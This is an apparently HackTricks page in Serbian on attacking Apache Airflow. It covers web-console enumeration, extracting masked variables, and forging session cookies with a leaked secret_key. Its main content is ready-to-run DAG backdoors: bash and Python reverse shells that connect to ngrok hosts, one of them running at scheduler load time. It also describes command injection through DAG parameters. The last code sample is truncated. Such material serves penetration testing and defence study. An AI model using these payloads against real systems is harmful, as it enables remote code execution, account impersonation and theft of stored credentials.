# Apache Airflow Bezbednost

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** me na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

[**Apache Airflow**](https://airflow.apache.org) služi kao platforma za **orkestraciju i zakazivanje data pipeline-ova ili radnih tokova**. Pojam "orkestracija" u kontekstu data pipeline-ova označava proces organizovanja, koordinacije i upravljanja složenim data radnim tokovima koji potiču iz različitih izvora. Osnovna svrha ovih orkestriranih data pipeline-ova je obezbeđivanje obrađenih i upotrebljivih skupova podataka. Ovi skupovi podataka se široko koriste od strane raznih aplikacija, uključujući, ali ne ograničavajući se na alate za poslovnu inteligenciju, modele za data nauku i mašinsko učenje, koji su osnova za funkcionisanje aplikacija velikih podataka.

U osnovi, Apache Airflow će vam omogućiti da **zakazujete izvršavanje koda kada se nešto** (dogadjaj, cron) **desi**.

## Lokalni Lab

### Docker-Compose

Možete koristiti **docker-compose konfiguracioni fajl sa** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) da pokrenete kompletno Apache Airflow okruženje u Dockeru. (Ako koristite MacOS, obezbedite da Docker VM ima najmanje 6GB RAM-a).

### Minikube

Jedan jednostavan način da **pokrenete Apache Airflow** je da ga pokrenete **sa minikube-om**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow Konfiguracija

Airflow može čuvati **osetljive informacije** u svojoj konfiguraciji ili možete pronaći slabu konfiguraciju:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Pre nego što počnete napadati Airflow, trebali biste razumeti **kako dozvole funkcionišu**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Napadi

### Enumeracija veb konzole

Ako imate **pristup veb konzoli**, možda ćete moći pristupiti nekim ili svim sledećim informacijama:

* **Promenljive** (Ovde se može čuvati prilagođene osetljive informacije)
* **Veze** (Ovde se može čuvati prilagođene osetljive informacije)
* Pristupite im na `http://<airflow>/connection/list/`
* [**Konfiguracija**](./#airflow-configuration) (Ovde se može čuvati osetljive informacije poput **`secret_key`** i lozinki)
* Lista **korisnika i uloga**
* **Kod svakog DAG-a** (koji može sadržati zanimljive informacije)

### Dobijanje vrednosti promenljivih

Promenljive se mogu čuvati u Airflow-u kako bi **DAG-ovi** mogli **pristupiti** njihovim vrednostima. Slično je tajnama drugih platformi. Ako imate **dovoljno dozvola**, možete im pristupiti u GUI na `http://<airflow>/variable/list/`.\
Airflow će po defaultu prikazivati vrednost promenljive u GUI-ju, međutim, prema [**ovome**](https://marclamberti.com/blog/variables-with-apache-airflow/), moguće je postaviti **listu promenljivih** čija će **vrednost** biti prikazana kao **zvezdice** u **GUI-ju**.

![](<../../.gitbook/assets/image (79).png>)

Međutim, ove **vrednosti** i dalje se mogu **dobiti** putem **CLI-ja** (potreban je pristup bazi podataka), **proizvoljnog izvršavanja DAG-a**, **API-ja** pristupanjem krajnjoj tački promenljivih (API mora biti aktiviran) i **čak samog GUI-ja!**\
Da biste pristupili tim vrednostima iz GUI-ja, jednostavno **izaberite promenljive** do kojih želite pristupiti i **kliknite na Akcije -> Izvoz**.\
Još jedan način je izvršiti **bruteforce** na **skrivenu vrednost** koristeći **pretragu filtriranja** dok je ne dobijete:

![](<../../.gitbook/assets/image (30).png>)

### Eskalacija privilegija

Ako je konfiguracija **`expose_config`** postavljena na **True**, korisnici sa ulogom **Korisnik** i **višom** mogu **čitati** konfiguraciju na vebu. U ovoj konfiguraciji se pojavljuje **`secret_key`**, što znači da bilo koji korisnik sa ovim ključem može **kreirati sopstveni potpisani kolačić da bi se predstavio kao bilo koji drugi korisnički nalog**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG Backdoor (RCE u Airflow radniku)

Ako imate **pristup pisanju** na mestu gde su **DAG-ovi sačuvani**, možete jednostavno **kreirati jedan** koji će vam poslati **obrnuti shell**.\
Imajte na umu da će se ovaj obrnuti shell izvršiti unutar **Airflow radničkog kontejnera**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG Backdoor (RCE u Airflow scheduleru)

Ako postavite nešto da se **izvrši u korenu koda**, u trenutku pisanja ovog teksta, to će biti **izvršeno od strane planera** nekoliko sekundi nakon što ga stavite u folder DAG-a.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### Kreiranje DAG-a

Ako uspete da **kompromitujete mašinu unutar DAG klastera**, možete kreirati nove **DAG skripte** u `dags/` folderu i one će biti **replikovane na ostalim mašinama** unutar DAG klastera.

### Ubacivanje koda u DAG

Kada izvršavate DAG iz GUI-ja, možete mu **proslediti argumente**.\
Stoga, ako DAG nije pravilno napisan, može biti **ranjiv na ubacivanje komandi**.\
To se dogodilo u ovom CVE-u: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Sve što trebate znati da biste **počeli tražiti ubacivanje komandi u DAG-ove** je da se **parametri** **pristupaju** pomoću koda **`dag_run.conf.get("param_name")`**.

Osim toga, ista ranjivost može se pojaviti i sa **promenljivama** (napomena: sa dovoljno privilegija možete **kontrolisati vrednost promenljivih** u GUI-ju). Promenljive se **pristupaju sa**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Ako se na primer koriste unutar bash komande, moguće je izvršiti ubacivanje komande.

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
